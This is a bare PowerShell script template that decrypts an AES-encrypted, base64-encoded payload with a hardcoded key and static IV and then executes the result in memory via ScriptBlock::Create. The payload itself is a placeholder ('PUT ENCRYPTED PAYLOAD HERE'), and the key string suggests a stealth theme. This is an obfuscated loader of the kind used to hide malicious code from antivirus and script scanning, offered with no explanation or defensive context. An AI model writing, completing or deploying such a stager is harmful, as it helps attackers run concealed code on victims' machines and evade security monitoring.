$e = "PUT ENCRYPTED PAYLOAD HERE"
$k = [Text.Encoding]::UTF8.GetBytes("0p53x.St34lth#21")
$ivHex = "0102030405060708090A0B0C0D0E0F10"
$iv = @()
for ($i = 0; $i -lt $ivHex.Length; $i += 2) {
    $iv += [Convert]::ToByte($ivHex.Substring($i, 2), 16)
}
$a = [Security.Cryptography.Aes]::Create(); $a.Mode = "CBC"; $a.Padding = "PKCS7"
$d = $a.CreateDecryptor($k, $iv)
$b = [Convert]::FromBase64String($e)
$m = New-Object IO.MemoryStream
$c = New-Object Security.Cryptography.CryptoStream($m, $d, "Write")
$c.Write($b, 0, $b.Length); $c.Close()
$s = [Text.Encoding]::UTF8.GetString($m.ToArray())
&([ScriptBlock]::Create($s))
